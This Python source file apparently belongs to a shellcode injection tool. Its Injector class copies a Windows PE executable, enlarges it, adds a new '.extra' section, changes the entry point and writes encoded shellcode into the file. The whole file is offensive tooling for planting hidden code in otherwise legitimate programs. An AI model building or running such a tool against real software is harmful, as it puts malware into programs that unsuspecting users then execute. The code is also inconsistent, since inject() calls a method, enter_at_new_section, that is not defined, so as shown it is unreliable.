import sys
from inject.shellcode import Shellcode
from inject.output import Output
from inject.pe_manager import PEManager

from typing import List
from pathlib import Path
from shutil import copy
from utils import shellcode_encoder
import mmap
from struct import pack
from pefile import PE

HEADER_SIZE = 40
EXTRA_SIZE_TO_RESTORE = 8


class Injector:
    def __init__(self, shellcode: bytes, file: Path, output: Path, options: dict):

        # Set Basics
        self.shellcode: Shellcode = Shellcode(shellcode, options)
        self.output: Output = Output(output, file)

        # Loaded /Computed Later
        self.manager: PEManager = None

    def inject(self):
        self.init()
        self.load()
        self.expand()
        self.create_new_section()
        self.enter_at_new_section()
        self.write_shellcode()
        print("-- Injection Complete --")

    def create_new_section(self):
        self.load_required()
        print("-- Creating New Section --")
        self.manager = self.manager.create_new_section(self.shellcode, ".extra")

    def enter_at_last_section(self):
        print("-- Changing Entry Point --")
        self.manager = self.manager.enter_at_last_section()

    def write_shellcode(self):
        print("-- Injecting Shellcode --")
        self.manager.write_shellcode(self.shellcode)

    def init(self):
        # delete old output if it exists
        self.output.clean()
        # copy source file to output file
        self.output.create_from_source()

    def init_required(self):
        if not self.is_init():
            msg = "[!] PEManager not initialized. Output may not exist. Please call 'init' first."
            print(msg)
            sys.exit()

    def is_init(self):
        if not self.output.exists():
            return False
        return True

    def expand(self):
        print("-- Expanding File --")
        # actually expand the file
        self.output.expand_for_sc(
            self.shellcode.get_final_size(), self.manager.file_alignment()
        )

    def load(self):
        self.init_required()
        print("-- PE Basic Info --")
        self.manager = PEManager(self.output)
        self.manager.dump_basic_info()

    def load_required(self):
        if not self.is_loaded():
            print('[!] PE was not loaded into "manager" target on PEManager')
            sys.exit()

    def is_loaded(self):
        if not self.manager:
            return False
        return True
